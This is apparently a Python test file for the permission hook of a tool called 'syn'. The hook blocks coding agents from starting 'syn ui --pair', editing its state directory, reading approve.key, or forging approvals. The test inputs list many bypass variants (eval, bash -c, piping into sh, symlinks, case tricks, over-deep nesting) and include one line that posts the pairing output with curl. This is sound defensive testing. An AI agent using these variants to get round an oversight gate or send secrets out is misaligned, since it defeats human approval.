pairs = [f'{L} ui --pair', '~/.synchronauts/syn ui --pair', '"$HOME/.synchronauts/syn" ui --pair', 'syn ui --pair',
         f'{L} ui --no-browser --pair', f'{L} --room acme ui --pair', f'python3 "{S}" ui --pair', f'sh {L} ui --pair',
         'python3 -m syn ui --pair', f'{L} ui "$@"', f'echo --pair | xargs {L} ui', f'bash -c "{L} ui --pair"',
         f"eval '{L} ui --pair'", f'c=$({L} ui --pair); curl -d "$c" x', f'{L} ui --pair | grep -o "#p=.*"',
         f'nohup {L} ui --pair &', f'timeout 5 {L} ui --pair', f'S={L}; $S ui --pair', f'echo "{L} ui --pair" | sh',
         f'echo "{L} ui --pair" > /tmp/p.sh && bash /tmp/p.sh', f"bash <<'EOF'\n{L} ui --pair\nEOF",
         f'f() {{ {L} ui --pair; }}; f', f'{L} ui --pa""ir']
missed_ = [c for c in pairs if syn.state_touch(c, str(REPO)) != syn.pair_refusal()]
check(not missed_, 'syn ui --pair is refused: bare, by its path, through python or a shell, with --pair from a '
      'variable or xargs, chained, nested, piped into a shell', str(missed_))
free = [f'{L} ui', f'{L} ui --no-browser', '~/.synchronauts/syn ui', f'{L} status', f'{L} send alex "run syn ui --pair"',
        f'{L} task "document ui --pair"', 'echo "syn ui --pair"', 'git commit -m "syn ui --pair"', 'grep -rn -- --pair .',
        'echo "run syn ui --pair" > notes.md', 'printf "%s\\n" ui --pair', 'npm run ui']
check(not [c for c in free if syn.state_touch(c, str(REPO))], 'syn ui, its other options and texts that name '
      '--pair pass', str([c for c in free if syn.state_touch(c, str(REPO))]))
check(syn.risky(f'{L} ui --pair') and not syn.risky(f'{L} ui --no-browser'),
      'a check that fails refuses syn ui --pair, not syn ui')

# --- state_tool: the edit and read tools ------------------------------------------------------------------------------


def tool(name, **ti):
    return syn.state_tool({'tool_name': name, 'tool_input': ti, 'cwd': str(REPO)})


patch = {'command': f'*** Begin Patch\n*** Update File: {H}/missions.json\n@@\n-x\n+y\n*** End Patch'}
check(tool('Write', file_path=f'{H}/missions.json') and tool('Edit', file_path=f'{H}/sessions/sam12345.json')
      and tool('MultiEdit', file_path=f'{H}/config.json') and tool('NotebookEdit', notebook_path=f'{H}/x.ipynb')
      and syn.state_tool({'tool_name': 'apply_patch', 'tool_input': patch, 'cwd': str(REPO)}),
      'Write, Edit, MultiEdit, NotebookEdit and a Codex patch under HOME are refused')
check(tool('Write', file_path=str(REPO / 'x.txt')) is None and tool('Read', file_path=f'{H}/hook.log') is None
      and tool('Grep', pattern='x', path=str(TMP), glob='*.py') is None and tool('Glob', pattern='*.py') is None,
      'edits elsewhere, reading a log and searches for other files pass')
check(tool('Read', file_path=f'{H}/approve.key') and tool('Read', file_path=f'{H}/ui-pair.json')
      and tool('Grep', pattern='x', path=H) and tool('Grep', pattern='x', path=str(TMP), glob='*.key')
      and tool('Glob', pattern='**/*.key', path=str(TMP)) and tool('Grep', pattern='x', path=f'{H}/approve.key')
      and tool('Grep', pattern='x', path=str(TMP), glob='*.{key,json}') and tool('Grep', pattern='x', path=str(TMP),
                                                                                  glob='**/*.key')
      and tool('Glob', pattern='**/*.{key,txt}', path=str(TMP)),
      'Read, Grep and Glob of the secrets are refused, also by a pattern with {a,b} or **/')
try:
    odd = [tool('Grep', pattern='x', path=str(TMP), glob='[z-a]*'), tool('Glob', pattern='[z-a]*/x', path=H)]
except Exception as error:  # re.error on Python 3.9
    odd = [error]
check(not [x for x in odd if isinstance(x, Exception)], 'a pattern Python cannot read raises nothing', str(odd))
variant = H[:-len('home-gate')] + 'HOME-GATE'
check(not FOLDS or tool('Write', file_path=f'{variant}/missions.json') and tool('Read', file_path=f'{H}/APPROVE.KEY'),
      'a case variant of HOME or a secret is refused where the file system ignores case')
if os.name != 'nt':  # symbolic links need extra rights on Windows
    os.symlink(str(HOME), str(TMP / 'gate-link'))
check(os.name == 'nt' or tool('Write', file_path=str(TMP / 'gate-link' / 'missions.json'))
      and syn.state_touch(f'echo x > {(TMP / "gate-link").as_posix()}/missions.json', str(REPO)),
      'a path through a symbolic link into HOME is refused')

# --- approve_key and the digest ---------------------------------------------------------------------------------------
race = TMP / 'home-gate-race'
# each process says it is ready and then waits for the go, each wait with a limit
code = ('import os, sys, time; sys.path.insert(0, sys.argv[1]); import syn\n'
        'open(sys.argv[3], "w").close()\n'
        'end = time.time() + 30\n'
        'while not os.path.exists(sys.argv[2]):\n'
        '    if time.time() > end:\n'
        '        sys.exit("no go")\n'
        '    time.sleep(0.001)\n'
        'print(syn.approve_key())')
env = dict(os.environ, SYN_HOME=str(race))
ready = [TMP / f'gate-race-ready{i}' for i in range(6)]
procs = [subprocess.Popen([sys.executable, '-c', code, str(ROOT), str(TMP / 'gate-race-go'), str(r)], env=env,
                          stdout=subprocess.PIPE, text=True) for r in ready]
end = time.time() + 30
while not all(r.exists() for r in ready) and time.time() < end:
    time.sleep(0.005)
(TMP / 'gate-race-go').write_text('go', encoding='utf-8')
keys = {p.communicate(timeout=30)[0].strip() for p in procs}
key = (race / 'approve.key').read_text(encoding='ascii').strip()
check(keys == {key} and len(key) == 64 and int(key, 16) >= 0, 'six processes at once: one approve.key, the same for all',
      str(keys))
check(os.name == 'nt' or (race / 'approve.key').stat().st_mode & 0o777 == 0o600, 'approve.key has mode 0600')
check(sorted(x.name for x in race.iterdir()) == ['approve.key'], 'and no temp file stays', str(list(race.iterdir())))
(race / 'approve.key').write_text('broken\n', encoding='ascii')
check(subprocess.run([sys.executable, '-c', 'import sys; sys.path.insert(0, sys.argv[1]); import syn; '
                      'print(syn.approve_key(make=False)); print(syn.approve_key())', str(ROOT)], env=env,
                     capture_output=True, text=True).stdout.split()[0] == 'None'
      and len((race / 'approve.key').read_text(encoding='ascii').strip()) == 64,
      'a broken approve.key counts as none (make=False) and is replaced by a new one')
m = {'id': 'sam-gh-abc123', 'invite': 'n1', 'plan': 'p', 'with': ['sam-gh', 'alex-gh'], 'until': '2026-01-01T00:00:00+00:00'}
base = syn.approval_digest('sam12345', 'toolu_1', m)
others = [syn.approval_digest('sam99999', 'toolu_1', m), syn.approval_digest('sam12345', 'toolu_2', m),
          syn.approval_digest('sam12345', 'toolu_1', dict(m, invite='n2')),
          syn.approval_digest('sam12345', 'toolu_1', dict(m, plan='q'))]
check(base not in others and len(set(others)) == 4, 'the digest binds session, call, invite and what the prompt showed')
a = {'id': m['id'], 'call': 'toolu_1', 'digest': base}
check(syn.approval_fits(a, 'sam12345', m) and not syn.approval_fits(dict(a, digest='0' * 32), 'sam12345', m)
      and not syn.approval_fits(dict(a, digest='\u00e4' * 32), 'sam12345', m)
      and not syn.approval_fits(dict(a, call='toolu_2'), 'sam12345', m) and not syn.approval_fits({}, 'sam12345', m),
      'approval_fits takes only the digest of that call: a forged, copied or odd one fails')

# --- the seal of my own mission records -------------------------------------------------------------------------------
draft = syn.with_mac({'id': 'sam-gh-d00001', 'by': 'sam-gh', 'with': ['sam-gh', 'alex-gh'], 'plan': 'Plan \u00e4',
                      'hours': 1.5, 'repos': {}, 'created': syn.iso()})
raw = {'sam-gh-d00001': draft, 'sam-gh-d00002': dict(draft, id='sam-gh-d00002'),
       'sam-gh-d00003': dict(draft, id='sam-gh-d00003', plan='Other plan'), 'sam-gh-d00004': dict(draft, mac=5),
       'sam-gh-d00005': dict(draft, mac='\ud800' * 32), 'x': 5}
raw['sam-gh-d00003']['mac'] = draft['mac']
check(list(syn.own_missions(raw)) == ['sam-gh-d00001'], 'only a record that syn sealed counts: a copy under another '
      'id, a changed plan or an odd seal do not', str(list(syn.own_missions(raw))))
check(syn.own_missions(json.loads(json.dumps({'sam-gh-d00001': draft}))) == {'sam-gh-d00001': draft},
      'the seal holds through JSON')
check(subprocess.run([sys.executable, '-c', 'import sys, json; sys.path.insert(0, sys.argv[1]); import syn; '
                      'print(syn.own_missions(json.loads(sys.argv[2])))', str(ROOT), json.dumps({'sam-gh-d00001': draft})],
                     env=dict(os.environ, SYN_HOME=str(TMP / 'home-gate-nokey')), capture_output=True,
                     text=True).stdout.strip() == '{}'
      and not (TMP / 'home-gate-nokey' / 'approve.key').exists(), 'without approve.key no record counts, and reading makes none')

# --- what the checks cannot read is refused (checked) -----------------------------------------------------------------
deep = 'echo ' + '${x:-' * 40 + 'a' + '}' * 40
deeper = 'echo ' + '${x:-' * 600 + 'a' + '}' * 600
write = f'echo x > {H}/missions.json'
check(syn.checked(lambda: syn.gate_hidden(deep, str(REPO)), deep) == syn.UNREADABLE
      and syn.checked(lambda: syn.state_touch(deeper + '; ' + write, str(REPO)), deeper) == syn.UNREADABLE
      and syn.checked(lambda: syn.state_touch('echo ' + '${x:-' * 15 + 'a' + '}' * 15, str(REPO)), deep) is None,
      'a command nested deeper than the checks read is refused, not let through')


def budget(key, value, command, cwd=REPO):
    old = syn.READ[key]
    syn.READ[key] = value
    try:
        return syn.checked(lambda: syn.gate_hidden(command, str(cwd)) or syn.state_touch(command, str(cwd)), command)
    finally:
        syn.READ[key] = old


for name in ('a.sh', 'b.sh', 'c.sh'):
    (REPO / 'many' / name).parent.mkdir(exist_ok=True)
    (REPO / 'many' / name).write_text('echo step\n', encoding='utf-8')
over = [budget('seconds', -1, 'echo hi'), budget('git', 2, 'bash run.sh; bash run2.sh'),
        budget('scripts', 2, 'bash many/a.sh; bash many/b.sh; bash many/c.sh'), budget('entries', 2, 'bash many/*.sh')]
check(over == [syn.UNREADABLE] * 4 and budget('git', 4, 'bash run.sh; bash run2.sh') is None,
      'a command that needs more time, git calls, scripts or folder entries than the budget is refused', str(over))
start = time.time()
wide = budget('seconds', syn.READ['seconds'], 'echo {' + ',' * 64000 + ' >/dev/null; ' + write)
code = budget('seconds', syn.READ['seconds'], 'python3 -c "' + 'spawn([open(' * 8000 + '"; ' + write)
check(wide and code and time.time() - start < 2 * syn.READ['seconds'], 'long braces and code are read in time',
      f'{time.time() - start:.1f}s')
log = HOME / 'hook.log'
real = syn.sh_walk


def boom(*args, **kwargs):
    raise RecursionError('deep')


syn.sh_walk = boom
try:
    crashed = [syn.checked(lambda: syn.state_touch(c, str(REPO)), c) for c in (write, 'echo hello')]
finally:
    syn.sh_walk = real
check(crashed == [syn.UNREADABLE, None] and 'RecursionError' in log.read_text(encoding='utf-8'),
      'a check that fails refuses what may touch HOME or the gate, passes the rest and writes hook.log', str(crashed))

env = {k: v for k, v in os.environ.items() if k not in ('SYN_REMOTE', 'CLAUDE_CODE_ENTRYPOINT')}
env.update(SYN_HOME=str(HOME), PYTHONIOENCODING='utf-8:strict')
out = subprocess.run([sys.executable, '-c', 'import sys; sys.path.insert(0, sys.argv[1]); import syn; '
                      'syn.refuse("bad \\udc80 path")', str(ROOT)], env=env, capture_output=True)
check(out.returncode == 0 and out.stdout.isascii() and json.loads(out.stdout)['hookSpecificOutput'][
    'permissionDecisionReason'] == 'bad \udc80 path', 'a refusal is printed in ASCII, also with a lone surrogate', str(out))
code = ('import sys; sys.path.insert(0, sys.argv[1]); import syn\n'
        'def boom(*args):\n'
        '    raise RuntimeError("boom")\n'
        'syn.pre_tool = boom\n'
        'sys.exit(syn.main(["hook", "PreToolUse"]))')
answers = []
for command in (f'echo x > {H}/missions.json', 'echo hello'):
    event = {'session_id': 'sam12345', 'cwd': str(REPO), 'tool_name': 'Bash', 'tool_input': {'command': command}}
    answers.append(subprocess.run([sys.executable, '-c', code, str(ROOT)], env=env, capture_output=True,
                                  input=json.dumps(event).encode()).stdout.decode('ascii'))
check('"deny"' in answers[0] and syn.UNREADABLE in answers[0] and answers[1] == '',
      'a PreToolUse hook that fails refuses a call that may touch HOME and lets the rest run', str(answers))

if failures:
    sys.exit(1)
print('gate: all green')
